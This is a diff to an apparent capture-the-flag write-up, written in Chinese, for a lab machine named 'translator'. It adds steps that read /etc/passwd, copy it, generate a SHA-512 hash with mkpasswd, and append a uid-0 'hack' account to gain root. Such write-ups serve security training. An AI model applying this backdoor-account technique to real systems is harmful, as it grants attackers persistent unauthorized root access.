@@ -105,6 +105,17 @@ sudo -u root /usr/local/bin/trans//尝试以root权限运行该翻译软件
 man /usr/local/bin/trans   //不会就问man,查看帮助命令
 ```
 
+cat /etc/passwd发现可以显示，添加root用户
+```C
+cat /etc/passwd
+cp /etc/passwd /tmp/passwd.bak
+cp /etc/passwd /tmp/file
+在kali中生成一个密码
+mkpasswd -m sha-512
+复制值到file的最后一行中,并按照格式修改成root用户hack:$6$8NJrwgxTZMywbrec$f7JVOZGjIXI0UnN6Ovdv0kzyqiWkhqpIgBOyJOX2AHX4Z4SGuBo8D17cYAolVkVbEtNwQ75ze90uhHbIsA21a0:0:0:root:/root:/bin/bash
+
+
+```
 
 ```C
 root@translator:~# cat root.txt
